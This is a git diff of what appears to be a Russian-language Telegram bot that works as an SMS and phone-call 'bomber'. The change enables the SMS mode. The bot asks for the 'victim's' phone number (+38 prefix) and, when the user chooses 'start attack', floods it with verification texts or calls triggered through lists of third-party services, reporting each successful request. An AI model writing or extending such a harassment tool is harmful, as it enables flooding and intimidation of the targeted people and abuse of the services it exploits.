@@ -34,12 +34,18 @@ const start = ctx => {
 
 bot.start(start)
 
-bot.hears('✉️ СМС', Telegraf.reply('В разработке...'))
-bot.hears('☎️ Звонки', async (ctx) => {
+bot.hears('✉️ СМС', (ctx) => {
+    ctx.session.bomberType = 'SMS'
+
+    return ctx.reply('Введи номер жертвы (с +38 в начале)', Keyboard.remove())
+})
+
+bot.hears('☎️ Звонки', (ctx) => {
     ctx.session.bomberType = 'Call'
 
     return ctx.reply('Введи номер жертвы (с +38 в начале)', Keyboard.remove())
 })
+
 bot.hears('Прекратить', async (ctx, next) => {
     if (ctx.session.bomber) {
         ctx.session.bomber.stop(true)
@@ -60,7 +66,9 @@ bot.hears('Начать атаку', async (ctx) => {
         active += 1
         await ctx.reply('Рассылаю запросы на звонки...', Keyboard.reply('Прекратить'))
 
-        ctx.session.bomber.start(callServices)
+        const services = ctx.session.bomberType === 'SMS' ? smsServices : callServices
+
+        ctx.session.bomber.start(services)
             .on('send', ({ result, site }) => {
                 ctx.telegram.sendMessage(ctx.chat.id, `[${ctx.session.bomber.success + 1}/${ctx.session.bomber.count}] Успешно: <code>${site.baseUrl || site.url}</code>`, Extra.webPreview(false).HTML())
                     .catch(() => 42)
@@ -120,12 +128,6 @@ bot.on('text', ctx => {
                 // limit: 3,
             })    
         }
-    
-        if (ctx.session.bomberType === 'SMS') {
-            ctx.session.bomber = new SMS(ctx.session.number, text || null, {
-                // limit: 3,
-            })   
-        }
 
         return ctx.reply('Готов начать?', Keyboard.reply(['Начать атаку', 'Отмена']))
     }
@@ -138,6 +140,14 @@ bot.on('text', ctx => {
 
     if (number.length !== 13) {
         return ctx.reply('Что-то не так с номером')
+    }
+
+    if (ctx.session.bomberType === 'SMS') {
+        ctx.session.bomber = new SMS(number, '', {
+            // limit: 3,
+        })
+
+        return ctx.reply('Готов начать?', Keyboard.reply(['Начать атаку', 'Отмена']))
     }
 
     ctx.session.number = number
